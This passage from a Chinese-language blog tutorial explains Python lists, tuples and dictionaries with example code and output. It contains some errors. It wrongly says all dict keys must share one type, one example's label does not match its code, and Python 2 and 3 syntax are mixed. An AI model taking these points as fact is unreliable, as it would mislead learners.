循环中使用切片。</li></ol></blockquote><br><p>下面示例代码（注意“//”不代表注释，仅仅为了展示）：</p><pre class="line-numbers language-python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span> <span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>list1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token operator">//</span>类似字符串一样使用索引<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"list1[0]: "</span><span class="token punctuation">,</span> list1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token operator">//</span>输出第一个元素<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"list2[1:5]: "</span><span class="token punctuation">,</span> list2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">//</span>输出索引为<span class="token number">1</span>到（<span class="token number">5</span><span class="token operator">-</span><span class="token number">1</span>）的元素<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"list2[:4]: "</span><span class="token punctuation">,</span> list2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">//</span>前者输出从第<span class="token number">1</span>个元素到索引为（<span class="token number">4</span><span class="token operator">-</span><span class="token number">1</span>）的元素                                    <span class="token operator">//</span>后者输出索引为<span class="token number">1</span>到最后一个元素运行结果：chemistry <span class="token number">1997</span> list1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  physics list2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span> list2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="三-更新列表"><font color="#FF6347" face="Comic sans MS">三. 更新列表</font><a href="post/Python-list-tuple-dict-set#三-更新列表"></a></h3><h4 id="3-1-处理元素"><font color="#3CB371" face="Comic sans MS">3.1 处理元素</font><a href="post/Python-list-tuple-dict-set#3-1-处理元素"></a></h4><p>附加参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/wl404/p/7884665.html" target="_blank" rel="noopener">列表使用大全</a>]</font> <font color="#00B2EE">[<a href="https://blog.csdn.net/viviliao_/article/details/79518219" target="_blank" rel="noopener">Python3列表元素的修改</a>]</font> </p><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>1. 按索引来使用的方法</strong></font></p><ol><li><font color="#FF7F00">append(‘String’)：</font> 将元素string追加到列表末尾，即把一个元素添加到堆栈顶；</li><li><font color="#FF7F00">pop(X)：</font> 删除列表中任何位置的元素，只需在括号中指定要删除的元素的索引即可。若果不指定则默认删除末尾的元素；</li><li><font color="#FF7F00">insert(X, “String”)：</font> 将元素String插入到索引为X的位置，原来元素从索引为X往后移；</li><li><font color="#FF7F00">del list[X]：</font> 删除列表list索引为X的元素；</li><li><font color="#FF7F00">len(list)：</font> 是个函数，统计列表list元素的个数，和在字符串中使用一样；</li><li>del和pop()的区别在于：del删除的元素不可以再继续使用了，但是pop()有个返回值，因为当作栈使用，它删除的元素还可以在其他地方继续使用；</li><li><font color="#FF7F00">reverse() ：</font> 按元素顺序倒转；</li><li><font color="#FF7F00">sort() ：</font> 是方法，对列表进行永久性排序，前提是列表中所有元素数据类型一样；</li><li><font color="#FF7F00">sorted() ：</font> 注意这是个函数，对列表进行临时排序，若列表中所有元素数据类型不一样会报错；</li></ol></blockquote><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>2. 按值来使用的方法</strong></font></p><ol><li><font color="#FF7F00"><strong>remove(“String”)</strong>：</font> 删除列表中值为String的元素。注意：方法remove() 只删除第一个指定的值。如果要删除的值可能在列表中出现多次，就需要使用循环来判断是否删除了所有这样的值。</li></ol></blockquote><br><p>下面示例代码（注意“//”不代表注释，仅仅为了展示）：</p><pre class="line-numbers language-python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span> <span class="token punctuation">]</span>list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Adam'</span><span class="token punctuation">)</span>      <span class="token operator">//</span>append<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>a <span class="token operator">=</span> list2<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>          <span class="token operator">//</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">del</span> list2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>              <span class="token operator">//</span><span class="token keyword">del</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span>list2<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>         <span class="token operator">//</span>insert<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token operator">//</span>len<span class="token punctuation">(</span><span class="token punctuation">)</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">1997</span><span class="token punctuation">)</span>        <span class="token operator">//</span>removelist1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"Adam"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token string">'Adam'</span><span class="token punctuation">]</span> <span class="token number">4</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span> <span class="token number">6</span> <span class="token punctuation">[</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'asp'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">]</span>s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                        <span class="token operator">//</span>临时排序<span class="token keyword">print</span><span class="token punctuation">(</span>sorted<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>   <span class="token operator">//</span>永久排序 s<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token operator">//</span>倒序运行结果：<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="3-2-嵌套使用列表"><font color="#3CB371" face="Comic sans MS">3.2 嵌套使用列表</font><a href="post/Python-list-tuple-dict-set#3-2-嵌套使用列表"></a></h4><br><pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'asp'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token number">4</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>要注意s只有4个元素，其中s[2]又是一个list，如果拆开写就更容易理解了。<br>要拿到’php’可以写p[1]或者s[2][1]，因此s可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。</p><pre class="line-numbers language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'asp'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">]</span>s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'asp'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'scheme'</span><span class="token punctuation">]</span> php php <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="四-列表常用的方法和函数"><font color="#FF6347" face="Comic sans MS">四. 列表常用的方法和函数</font><a href="post/Python-list-tuple-dict-set#四-列表常用的方法和函数"></a></h3><h4 id="4-1-列表操作符"><font color="#3CB371" face="Comic sans MS">4.1 列表操作符</font><a href="post/Python-list-tuple-dict-set#4-1-列表操作符"></a></h4><p>列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。<br>如下所示：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">Python表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">长度</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">组合</td></tr><tr><td align="left">[‘Hi!’] * 4</td><td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td align="left">重复</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">元素是否存在于列表中</td></tr><tr><td align="left">for x in [1, 2, 3]: print x,</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table></div></div><br><br><h4 id="4-2-列表函数-amp-方法"><font color="#3CB371" face="Comic sans MS">4.2 列表函数&amp;方法</font><a href="post/Python-list-tuple-dict-set#4-2-列表函数-amp-方法"></a></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-lists.html" target="_blank" rel="noopener">Python列表函数&amp;方法</a>]</font></p><p>列表中Python包含以下函数:</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">cmp(list1, list2)<br>比较两个列表的元素</td></tr><tr><td align="center">2</td><td align="left">len(list)<br>列表元素个数</td></tr><tr><td align="center">3</td><td align="left">max(list)<br>返回列表元素最大值</td></tr><tr><td align="center">4</td><td align="left">min(list)<br>返回列表元素最小值</td></tr><tr><td align="center">5</td><td align="left">list(seq)<br>将元组转换为列表</td></tr></tbody></table></div></div><br><p>Python包含以下方法:</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">list.append(obj)<br>在列表末尾添加新的对象</td></tr><tr><td align="center">2</td><td align="left">list.count(obj)<br>统计某个元素在列表中出现的次数</td></tr><tr><td align="center">3</td><td align="left">list.extend(seq)<br>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td align="center">4</td><td align="left">list.index(obj)<br>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td align="center">5</td><td align="left">list.insert(index, obj)<br>将对象插入列表</td></tr><tr><td align="center">6</td><td align="left">list.pop([index=-1])<br>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td align="center">7</td><td align="left">list.remove(obj)<br>移除列表中某个值的第一个匹配项</td></tr><tr><td align="center">8</td><td align="left">list.reverse()<br>反向列表中元素</td></tr><tr><td align="center">9</td><td align="left">list.sort(cmp=None, key=None, reverse=False)<br>对原列表进行排序</td></tr></tbody></table></div></div><br><br><h3 id="五-元组"><font color="#FF6347" face="Comic sans MS">五. 元组</font><a href="post/Python-list-tuple-dict-set#五-元组"></a></h3><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>什么是元组tuple：</strong></font></p><ol><li>Python的元组与列表类似，不同之处在于元组的元素不能修改。</li><li>元组使用小括号<code>()</code>，列表使用方括号<code>[]</code>。</li><li>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</li><li>当括号中只有一个数字没有逗号时，既表示一个数字也可以便是一个元组，又可以表示数学公式中的小括号，这就产生了歧义。这种情况下，按小括号进行计算，计算结果自然是1。所以，只有1个元素的tuple定义时<font color="#FF7F00"><strong>必须加一个逗号</strong></font>。</li></ol></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>一、定义元组</strong></font></p><pre class="line-numbers language-python"><code class="language-python">tup1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>tup2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span>tup3 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><p>创建空元组：<code>tup1 = ()</code></p><p>元组中只包含一个元素时，需要在元素后面添加逗号。<code>tup1 = (50,)</code></p><p>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</p><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、使用元组</strong></font></p><ol><li>元组可以使用下标索引来访问元组中的值，如下：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>tup1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>tup2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"tup1[0]: "</span><span class="token punctuation">,</span> tup1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"tup2[1:5]: "</span><span class="token punctuation">,</span> tup2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>以上实例输出结果：tup1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  physicstup2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>元组的值不允许修改，但是可以进行运算，比如连接用加号（+），重复用星号（*）。</p></li><li><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组</p></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>tup <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token keyword">print</span> tup<span class="token keyword">del</span> tup<span class="token keyword">print</span> <span class="token string">"After deleting tup : "</span><span class="token keyword">print</span> tup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上实例元组被删除后，输出变量会有异常信息，输出如下所示：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>After deleting tup <span class="token punctuation">:</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"test.py"</span><span class="token punctuation">,</span> line <span class="token number">9</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">print</span> tupNameError<span class="token punctuation">:</span> name <span class="token string">'tup'</span> <span class="token keyword">is</span> <span class="token operator">not</span> defined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="4"><li><font color="#FF7F00"><strong>最后来看一个“可变的”tuple：</strong></font></li></ol><pre class="line-numbers language-python"><code class="language-python">t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Y'</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>运行结果：<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个tuple定义的时候有3个元素，分别是’a’，’b’和一个list。不是说tuple一旦定义后就不可变了吗？怎么后来又变了？<br>别急，我们先看看定义的时候tuple包含的3个元素：</p><div class="article-img"><p><img src="https://i.loli.net/2019/02/28/5c77b1cc56635.png" alt="0.png" data-zoomable></p></div><p>当我们把list的元素’A’和’B’修改为’X’和’Y’后，tuple变为：</p><div class="article-img"><p><img src="https://i.loli.net/2019/02/28/5c77b1f4c3628.png" alt="0 (1).png" data-zoomable></p></div><br><p>表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向’a’，就不能改成指向’b’，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的！</p><p>理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。</p><br><p><font color="#00B2EE" face="Comic sans MS"><strong>三、元组运算符</strong></font></p><p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">Python表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len((1, 2, 3))</td><td align="left">3</td><td align="left">计算元素个数</td></tr><tr><td align="left">(1, 2, 3) + (4, 5, 6)</td><td align="left">(1, 2, 3, 4, 5, 6)</td><td align="left">连接</td></tr><tr><td align="left">(‘Hi!’,) * 4</td><td align="left">(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td><td align="left">复制</td></tr><tr><td align="left">3 in (1, 2, 3)</td><td align="left">True</td><td align="left">元素是否存在</td></tr><tr><td align="left">for x in (1, 2, 3): print x,</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>四、元组内置函数</strong></font></p><p>Python元组包含了以下内置函数</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">cmp(tuple1, tuple2)<br>比较两个元组元素。</td></tr><tr><td align="center">2</td><td align="left">len(tuple)<br>计算元组元素个数。</td></tr><tr><td align="center">3</td><td align="left">max(tuple)<br>返回元组中元素最大值。</td></tr><tr><td align="center">4</td><td align="left">min(tuple)<br>返回元组中元素最小值。</td></tr><tr><td align="center">5</td><td align="left">tuple(seq)<br>将列表转换为元组。</td></tr></tbody></table></div></div><br><br><h3 id="六-字典"><font color="#FF6347" face="Comic sans MS">六. 字典</font><a href="post/Python-list-tuple-dict-set#六-字典"></a></h3><h4 id="6-1-字典的定义"><font color="#3CB371" face="Comic sans MS">6.1 字典的定义</font><a href="post/Python-list-tuple-dict-set#6-1-字典的定义"></a></h4><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>关于字典dict：</strong></font></p><ol><li>字典是另一种可变容器模型，且可存储任意类型对象；</li><li>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中；<code>d = {key1 : value1, key2 : value2 }</code></li><li>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一；</li><li>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组；</li><li>第一个键定义为什么数据类型，后面所有的键必须定义为相同的数据类型；</li><li>访问字典里的值，把相应的键放入熟悉的方括弧即可，<code>dict[key]</code></li></ol></blockquote><br><h4 id="6-2-字典的修改"><font color="#3CB371" face="Comic sans MS">6.2 字典的修改</font><a href="post/Python-list-tuple-dict-set#6-2-字典的修改"></a></h4><p>向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对</p><p><font color="#00B2EE" face="Comic sans MS"><strong>一、添加键—值对、修改字典</strong></font><br><br></p><p><font color="#FF7F00"><strong>字典是一种动态结构，可随时在其中添加键—值对</strong></font>。要添加键—值对，可依次指定字典名、用方括号括起的键和相关联的值。</p><p>如下示例，我们先建立一个空字典，然后向里面添加元素（键值对）并修改：<br><font color="#FF7F00"></font></p><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>a<span class="token punctuation">[</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'green'</span>a<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">5</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">666</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>运行结果：green <span class="token number">5</span><span class="token number">666</span> <span class="token number">5</span><span aria-hidden="true" 